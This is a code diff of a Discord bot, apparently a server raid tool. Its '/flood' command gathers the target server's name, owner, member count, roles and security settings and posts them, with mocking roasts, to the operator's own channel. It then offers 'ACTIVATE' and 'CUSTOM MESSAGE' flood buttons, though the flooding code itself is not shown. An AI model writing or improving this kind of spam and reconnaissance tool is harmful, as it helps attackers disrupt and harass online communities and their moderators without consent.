@@ -8,28 +8,20 @@ const {
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID; // optional: for testing guild-specific
+const GUILD_ID = process.env.GUILD_ID; // optional if you want guild-specific commands
 const NOTIFY_CHANNEL_ID = process.env.NOTIFY_CHANNEL_ID;
 const SELF_URL = process.env.SELF_URL;
 
-// Keep-alive for Railway
+// Keep-alive server for Railway
 const app = express();
 app.get('/', (req, res) => res.send('Bot running'));
 app.listen(process.env.PORT || 3000, () => console.log('Server ready'));
 
 // Discord client
-const client = new Client({ 
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.GuildMembers
-  ]
-});
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
 
-// Slash command registration
-const commands = [
-  new SlashCommandBuilder().setName('flood').setDescription('Flooding command').toJSON()
-];
+// Register /flood command
+const commands = [new SlashCommandBuilder().setName('flood').setDescription('Flooding command').toJSON()];
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 (async () => {
   try {
@@ -40,72 +32,94 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
       await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
       console.log('Slash command registered globally.');
     }
-  } catch(err){ console.error(err); }
+  } catch (err) { console.error(err); }
 })();
 
-// Funny roasts
+// Funny roasts array
 const roasts = [
-  "Yo %SERVER%, did you hire a hamster to moderate this place?",
+  "Yo %SERVER%, did you hire a hamster to moderate this place? 😂",
   "%SERVER% members: active. Moderation: asleep.",
-  "Wow %SERVER%, your rules are more like suggestions.",
+  "Wow %SERVER%, your rules are more like suggestions, huh?",
   "Nice server, %SERVER%. Did someone forget to turn on the brain?",
+  "0/10 would trust %SERVER% with a single emoji.",
+  "%SERVER% moderation team: ghosts confirmed.",
+  "Members in %SERVER%: 100. Brain cells: missing.",
+  "%SERVER% looks peaceful... too bad it isn’t.",
+  "Roles in %SERVER%? Might as well be invisible.",
+  "Boosts in %SERVER% can’t fix the chaos inside.",
   "Admins of %SERVER%: are you even here?",
+  "Oh look %SERVER%, another emoji. Didn’t help the moderation.",
+  "Keep it up %SERVER%, you’re trending on chaos charts.",
   "%SERVER% – where rules go to die.",
-  "Congrats %SERVER%, you just got roasted by a bot."
+  "%SERVER% security: more holes than Swiss cheese.",
+  "Congrats %SERVER%, you just got roasted by a bot.",
+  "Members of %SERVER%: active. Brain cells: missing.",
+  "%SERVER% – a safe space for memes and disasters.",
+  "%SERVER% forgot how to enforce rules, apparently.",
+  "Looks like %SERVER% moderation is on permanent vacation.",
+  "Wow %SERVER%, you made a server without any sense of order.",
+  "%SERVER% admins: free advice — maybe read the manual?",
+  "%SERVER% – where chaos is king and rules are peasants.",
+  "0/10, wouldn’t recommend %SERVER% for moderation tips.",
+  "Nice try %SERVER%, but amateurs everywhere.",
+  "If chaos was a sport, %SERVER% would be gold medalists."
 ];
 
-// Cache for button interactions
+// Cache for modal/button interactions
 const floodCache = new Map();
 
 client.on('interactionCreate', async interaction => {
-  try{
-    // /flood command
+  try {
+    // Slash command /flood
     if(interaction.isChatInputCommand() && interaction.commandName === 'flood'){
-      let guild = interaction.guild;
-      try{
-        guild = await interaction.guild.fetch(); // fetch latest
-      } catch(err){
-        console.warn("Guild fetch failed, using basic info:", err);
-      }
+      // Fetch full guild for accurate detection
+      const guild = await interaction.guild.fetch().catch(() => interaction.guild);
       const channel = interaction.channel;
-      const memberCount = guild.memberCount || 0;
-      const guildName = guild.name || "Unknown Server";
+      const guildName = guild?.name || "Unknown Server";
+      const memberCount = guild?.memberCount || 0;
 
-      // prevent duplicate notification
+      // Prevent multiple notifications per user
       if(floodCache.has(interaction.user.id)) floodCache.delete(interaction.user.id);
       floodCache.set(interaction.user.id, true);
 
-      // roast + embed
-      let roast = roasts[Math.floor(Math.random()*roasts.length)].replace('%SERVER%', guildName);
+      // --- Pick a random roast ---
+      let roast = roasts[Math.floor(Math.random() * roasts.length)];
+      roast = roast.replace('%SERVER%', guildName).replace('%MEMBERS%', memberCount);
+
+      // --- Embed without emojis ---
       const embed = new EmbedBuilder()
         .setTitle('COMMAND EXECUTED')
         .setColor(0xFF0000)
         .addFields(
           { name: 'Server Name', value: guildName, inline: true },
           { name: 'Members', value: `${memberCount}`, inline: true },
-          { name: 'Server Owner', value: guild.ownerId ? `<@${guild.ownerId}>` : "Unknown", inline: true },
-          { name: 'Server Created', value: guild.createdAt?.toLocaleDateString() || 'N/A', inline: true },
-          { name: 'Roles', value: `${guild.roles?.cache.size || 0}`, inline: true },
-          { name: 'Boost Level', value: `${guild.premiumTier || 0}`, inline: true },
-          { name: 'Boost Count', value: `${guild.premiumSubscriptionCount || 0}`, inline: true },
-          { name: 'Verification Level', value: `${guild.verificationLevel || 'Unknown'}`, inline: true },
+          { name: 'Server Owner', value: guild?.ownerId ? `<@${guild.ownerId}>` : "Unknown", inline: true },
+          { name: 'Server Created', value: guild?.createdAt?.toLocaleDateString() || 'N/A', inline: true },
+          { name: 'Roles', value: `${guild?.roles?.cache.size || 0}`, inline: true },
+          { name: 'Boost Level', value: `${guild?.premiumTier || 0}`, inline: true },
+          { name: 'Boost Count', value: `${guild?.premiumSubscriptionCount || 0}`, inline: true },
+          { name: 'Verification Level', value: `${guild?.verificationLevel || 'Unknown'}`, inline: true },
           { name: 'Channel', value: `#${channel?.name || 'Unknown'}`, inline: true },
           { name: 'Command Run By', value: interaction.user.tag, inline: true },
           { name: 'Bot Latency', value: `${client.ws.ping}ms`, inline: true }
         )
         .setTimestamp(new Date());
 
-      // send roast + embed once
-      const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID);
-      if(notifyChannel?.isTextBased()) await notifyChannel.send({ content: roast, embeds: [embed] });
+      // --- Send roast + embed once ---
+      const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID).catch(() => null);
+      if(notifyChannel?.isTextBased()){
+        await notifyChannel.send({ content: roast, embeds: [embed] });
+      }
 
-      // ephemeral flood menu
-      const floodEmbed = new EmbedBuilder().setTitle('READY TO FLOOD?').setColor(0xFF0000);
-      const row = new ActionRowBuilder()
-        .addComponents(
-          new ButtonBuilder().setCustomId('activate').setLabel('ACTIVATE!').setStyle(ButtonStyle.Primary),
-          new ButtonBuilder().setCustomId('custom_message').setLabel('CUSTOM MESSAGE').setStyle(ButtonStyle.Secondary)
-        );
+      // --- Ephemeral flood menu ---
+      const floodEmbed = new EmbedBuilder()
+        .setTitle('READY TO FLOOD?')
+        .setColor(0xFF0000);
+
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('activate').setLabel('ACTIVATE!').setStyle(ButtonStyle.Primary),
+        new ButtonBuilder().setCustomId('custom_message').setLabel('CUSTOM MESSAGE').setStyle(ButtonStyle.Secondary)
+      );
 
       await interaction.reply({ embeds: [floodEmbed], components: [row], ephemeral: true });
     }
